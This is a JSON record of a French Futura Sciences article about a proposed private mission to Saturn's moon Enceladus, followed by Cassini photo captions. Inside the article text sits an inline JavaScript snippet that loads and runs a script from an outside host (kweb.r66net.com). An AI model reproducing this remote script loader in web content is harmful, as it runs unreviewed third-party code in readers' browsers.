{"title": "Encelade : une nouvelle exploration à l'étude", "newspaper": "Futura Sciences", "author": "Xavier Demeersman", "date_publi": "29/11/2017", "content": "Encelade, satellite naturel de Saturne, est l'une des destinations privilégiées pour de futures sondes spatiales. Le milliardaire russe Iouri Milner a révélé qu'une mission financée par des fonds privés était à l'étude pour en savoir plus sur ce monde potentiellement habitable. À l'occasion d'une interview organisée par le magazine  The Economist , le milliardaire russe Iouri Milner — qui, au passage, finance le projet  Breakthrough Listen  visant à aider la recherche d' intelligence  extraterrestre et aussi le programme  Breakthrough Starshot  qui, lui, veut préparer les premières sondes d'exploration du système voisin Alpha du Centaure — s'est dit très intéressé pour envoyer une mission sur (ou autour) d' Encelade . En effet, cette petite  lune  de  Saturne  de quelque 500 km de diamètre aiguise beaucoup la curiosité des chercheurs — en particulier celle des exobiologistes — et aussi celle du grand public depuis que feu la sonde  Cassini  a révélé l'existence de  geysers  (en 2005) et, plus tard, induit la présence d'un  océan global  sous sa surface gelée. Mais ce n'est pas tout : les indices détectés d'une  activité hydrothermale  dans ses profondeurs suggèrent que l' astre  est  potentiellement habitable . Aussi, pour découvrir s'il existe de la vie ailleurs que sur  Terre , Encelade — tout comme Europe autour de  Jupiter  — apparaît donc comme une cible privilégiée. Animation créée à partir de 6 images prises par Cassini en l’espace de 15 mn le 1 er  août 2017, à 180.000 km de distance. © Nasa, JPL-Caltech,  Space Science Institute                               Un projet de mission privée qui pourrait démarrer dès l'année prochaine Évidemment, la Nasa et l' ESA  sont très intéressées pour s'y rendre. D'ailleurs, des projets sont en cours d'évaluation dans le cadre du programme  New Frontiers . Une sélection finale pourrait être faite au cours du printemps... 2019, pour un lancement vers 2025. Ensuite, il faudra attendre que la sonde parcoure le milliard et demi de kilomètres qui nous sépare d'Encelade...  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Pour Iouri Milner, c'est trop long. C'est pourquoi il a indiqué que la  Breakthrough Prize Foundation  réfléchissait depuis quelques mois à la faisabilité d'une mission privée.  « Nous avons formé un petit atelier autour de cette idée , a-t-il révélé le 9 novembre.  Pouvons-nous concevoir une mission à faible coût financée par des fonds privés vers Encelade qui pourrait être lancée relativement rapidement et examinerait plus en détail ses panaches afin d'essayer de voir ce qui se passe là-bas ? »  Cette mission partirait en quelque sorte en éclaireur. Le milliardaire ne s'est pas appesanti sur les détails, indiquant juste que toutes les options étaient envisagées, du  survol  rapide d'Encelade à une mission en  orbite  autour de Saturne. Une participation de la Nasa et de l'ESA n'est pas exclue non plus. Pete Worden, qui préside la fondation, a indiqué qu'une première étude avait été recalée car trop chère. À présent, des alternatives moins coûteuses impliquant des  voiles solaires  sont examinées. Rendez-vous dans un peu plus de six mois pour de nouveaux développements.  « J'espère que plus tard, l'année prochaine si tout va bien, nous serons en marche »,  a-t-il déclaré. Photos : Les plus belles images du monde de Saturne vu par Cassini La dernière image de Saturne                                       Saturne vue par Cassini le 13 septembre 2017. La sonde se dirigeait vers la planète pour son plongeon final. © Nasa, JPL-Caltech, SSI, Jason Major                                                                       Saturne à l’approche de l’été                                       L’hémisphère nord de Saturne le 25 avril 2016, à l’approche du solstice d’été pour le « seigneur des anneaux » en mai 2017 (l’année de Saturne dure 29 années terrestres). Au cours de ses 13 années d’exploration, la sonde Cassini a pu voir la planète géante passer de l’hiver au printemps, dans l’hémisphère nord et de l’été à l’automne, dans l’hémisphère sud. © Nasa, JPL-Caltech, Space Science Institute                                                                       Saturne et ses anneaux, portrait rapproché                                       Le 19 janvier 2007, l'orbite de Cassini l'a éloignée de Saturne. De ce lointain poste d'observation, la sonde, arrivée depuis près de deux ans et demi, prend un cliché de la planète aux anneaux devenu célèbre. © Nasa, JPL, Space Science Institute                                                                       La Terre, Vénus et Mars vues de Saturne                                       Le 19 juillet 2013, la sonde spatiale Cassini profita d’un passage dans l’ombre de Saturne pour photographier à contre-jour les anneaux, quelques satellites naturels, Mars, Vénus et la Terre. Notre planète apparaît comme un « pâle petit point bleu » selon l'expression de l’astronome Carl Sagan. Il faisait jour et beau en Europe ce jour-là : vous êtes sur la photo. © Nasa, JPL-Caltech, SSI                                                                       Le grand panorama des anneaux de Saturne                                       Saturne doit principalement sa renommée et sa beauté à ses anneaux de glace. Innombrables, ils se distinguent en cinq principaux groupes séparés par des vides plus ou moins importants. Cette image mosaïque en couleur naturelle fut prise par Cassini le 26 novembre à une distance de 1,1 million de km. La composition embrasse les anneaux sur une largeur de 65.700 km. © Nasa, JPL, Space Science Institute                                                                       Dans les anneaux de Saturne, l'hélice Blériot                                       Des structures évoquant une hélice bipale, invisibles depuis la Terre, ont été observées au sein des anneaux. Ici, l'une des plus célèbres, baptisée Blériot, en l'honneur de l'aviateur français connu pour avoir réussi la première traversée de la Manche en avion en 1909. Ce sont des perturbations parmi les minuscules particules formant les anneaux, comme des vagues. Plus ou moins stables, elles mesurent plusieurs centaines de kilomètres. En leur centre doit se trouver un tout petit satellite, dont la dimension doit être comprise entre 1 et 2 km, invisible sur la photographie. © Nasa, JPL-Caltech, SSI                                                                       Gros plan sur les anneaux de Saturne                                       Voici une partie des anneaux de Saturne, situés entre 98.600 et 105.500 km de la géante gazeuse, dans le groupe de l’anneau B. Ils sont composés d’une multitude de particules (notamment de glace d’eau) de petite taille. Leur densité est variable. © Nasa, JPL, Space Science Institute                                                                       D'étranges frises sur le bord des anneaux                                       À l’approche de l’équinoxe en 2009, l’éclairage solaire dévoile des structures insoupçonnées en marge de l’anneau B. Les reliefs s’élèvent jusqu’à 2,5 km au-dessus du plan des anneaux. Il est probable que de minuscules lunes circulant entre les anneaux A et B en perturbent régulièrement les bordures. © Nasa, JPL, Space Science Institute                                                                       Au-dessus de Saturne                                       Magnifique portrait de Saturne, deuxième plus grosse planète du Système solaire, photographiée le 10 octobre 2013 lors d’un survol polaire de la sonde Cassini. L’image mosaïque fut retravaillée par un grand fan de la mission et astronome amateur, Gordan Ugarkovic. On distingue le grand hexagone qui occupe le pôle nord. La région est éclairée (c’est alors le printemps dans l’hémisphère nord). Côté anneaux, on peut observer les principales séparations : la division de Cassini, de Hencke, Maxwell et Colombo. © Nasa, JPL, Space Science Institute, Gordan Ugarkovic                                                                       Le célèbre hexagone du pôle nord de Saturne                                       Première vue complète de l'immense structure avec six faces de courants-jets présente au pôle nord de Saturne. Surnommée l'« hexagone », elle s'étend jusqu'à 70° de latitude. L'équinoxe de printemps dans l'hémisphère nord, qui a débuté en 2009, permet au pôle nord de la planète géante d'être enfin exposé au Soleil. Ces images en fausses couleurs ont été capturées par la sonde spatiale Cassini. © Nasa, JPL-Caltech, SSI, Université de Hampton.                                                                       Gros plan sur l’hexagone du pôle nord de Saturne                                       Gros plan sur le pôle nord de Saturne. L’image a été prise par Cassini le 8 septembre 2017. La grande structure hexagonale s’étend jusqu’à 70° de latitude et ses côtés mesurent environ 13.800 km. Sa période de rotation est de près de 10 h 40. Le pôle sud, quant à lui, ne présente pas de système hexagonal. © Nasa,JPL-Caltech, SSI, Kevin M. Gill                                                                       Une tempête géante sur Saturne                                       Trois mois après son apparition remarquée dans l’hémisphère nord de Saturne en décembre 2010, la tempête provoquée par les changements de saison poursuivait son expansion dans la haute atmosphère. Cassini l'a observée jusqu'en 2011. Depuis la Terre, une tempête semblable avait été observée il y a trente ans, c'est-à-dire une année saturnienne. © Nasa, JPL, Space Science Institute                                                                       Les geysers d'Encelade                                       Courant 2005, les scientifiques remarquent la présence de geysers sur le limbe du petit satellite naturel Encelade (environ 500 km). Les analyses ultérieures montreront qu’il s’agit de particules de glace. Surgit alors l’hypothèse qu’il existe un océan d’eau liquide sous sa surface gelée. © Nasa, JPL, Space Science Institute                                                                       Premier survol de Titan par la sonde Cassini                                       Arrivée le 30 juin 2004, la sonde Cassini entreprit son premier survol de Titan le 26 octobre de la même année. Sur cette image mosaïque retravaillée pour réduire les effets de l’atmosphère, on distingue à droite, une région brillante nommée Xanadu. Les scientifiques n’avaient pas encore caractérisé les étendues de méthane liquide. © Nasa, JPL, Space Science Institute                                                                       Première image de la surface de Titan                                       Développée par l’Agence spatiale européenne (Esa), la sonde Huygens qui a voyagé jusqu’à Saturne en compagnie de Cassini, toucha le sol de la lune Titan le 14 janvier 2005, après une descente de près de 2 h 30 afin d’étudier son atmosphère. Photographiés à une distance d’environ 85 cm, les blocs visibles au premier plan sont davantage des galets que des rochers. Leurs rondeurs a suggéré aux scientifiques une érosion. © Nasa, Esa, JPL, Université de l’Arizona                                                                       Encelade, une lune potentiellement habitable                                       Parmi les grandes découvertes de Cassini figurent les geysers d’Encelade (500 km de diamètre). Depuis 2005, les observations et les mesures de la sonde ont permis aux chercheurs de supposer que la petite lune abrite un vaste océan d’eau liquide sous sa surface de glace qui, comme on peut le voir, se fissure. © Nasa, JPL-Caltech, Space Science Institute                                                                       Encelade et ses geysers                                       Sur cette image capturée par Cassini le 13 octobre 2009, on peut voir une partie d’Encelade directement illuminée par le Soleil et une autre éclairée par la lumière du Soleil réfléchie par Saturne. Jaillissant du pôle sud de cette lune glacée, des geysers d’eau. © Nasa, JPL, Space Science Institute                                                                       Les deux plus grandes lunes de Saturne                                       Les deux plus grandes lunes de Saturne alignées : au premier plan, Rhéa (1.528 km) et, à l’arrière-plan, Titan (5.150 km). Le 16 juin 2011, Cassini était alors à 1,8 million de km de la première et à 2,5 millions de km de la seconde. Les deux lunes arborent deux surfaces très différentes. © Nasa, JPL-Caltech, Space Science Institute                                                                       Japet, une terre de contraste                                       Images composite des deux hémisphères de Japet capturées par Cassini respectivement en 2004 et 2007. Cette petite lune de Saturne de 1.471 km de diamètre arbore à sa surface une indéniable dichotomie : des terrains aussi sombres que le charbon (environ 40 % de sa surface) contrastant avec d’autres aussi clairs que la neige. Le grand bassin d’impact Engelier (vue de droite, en bas) mesure 504 km de diamètre. © Nasa, JPL, Space Science Institute                                                                       L’ombre de Mimas sur les anneaux de Saturne                                       Cette image a été prise par Cassini le 8 avril 2009 à 1,1 million de km de distance. La petite lune Mimas (396 km) qui gravite autour de Saturne dans le « vide » de la fameuse division de Cassini, projette son ombre sur les anneaux autour d’elle. La scène a pu être possible en raison de l’équinoxe d’août 2009 (ils se déroulent tous les 15 ans) qui approchait. © Nasa, JPL, Space Science Institute                                                                       Pan, une soucoupe volante autour de Saturne                                       Deux vues du curieux Pan, un satellite qui tourne près de Saturne (à moins de 134.000 km du centre de la planète), au milieu de la division Encke de l'anneau A. Ce petit corps de 35 km de diamètre maximal pour 23 km de hauteur est formé de particules glacées, les mêmes que celles formant l'anneau où il se trouve, et qu'il accumule à son équateur, ce qui lui donne cette allure de soucoupe volante. © Nasa, JPL, Space Science Institute                                                                       La petite Peggy deviendra-t-elle une lune ?                                       Sur cette image saisie par Cassini le 15 avril 2013, on distingue sur le bord de l'anneau A la possible formation d’une petite lune que les astronomes ont surnommée Peggy. © Nasa, JPL-Caltech, Space Science Institute                                                                       Daphnis fait des vagues dans les anneaux de Saturne                                       Bien que minuscule — 8 km de longueur —, Daphnis a une force d’attraction suffisante pour perturber les petits grains qui composent les anneaux au milieu desquels elle se fraie un chemin. La petite lune se balade dans l’espace de Keeler, à l’intérieur de l’anneau A de Saturne. © Nasa, JPL-Caltech, Space Science Institute                                                                       Dernière image d’Encelade                                       Dernière image de Cassini d’Encelade avant que la sonde ne sombre dans l’atmosphère de Saturne. © Nasa, JPL-Caltech, SSI                                                                       Vous avez aimé cet article ? N'hésitez pas à le partager avec vos ami(e)s et aidez-nous à faire connaître Futura :) ! La Rédaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest À voir aussi :  encelade vie  |  encelade  |  eau sur encelade  |  satellite encelade  |  space exploration  |  exploration spatiale", "theme": "sciences"}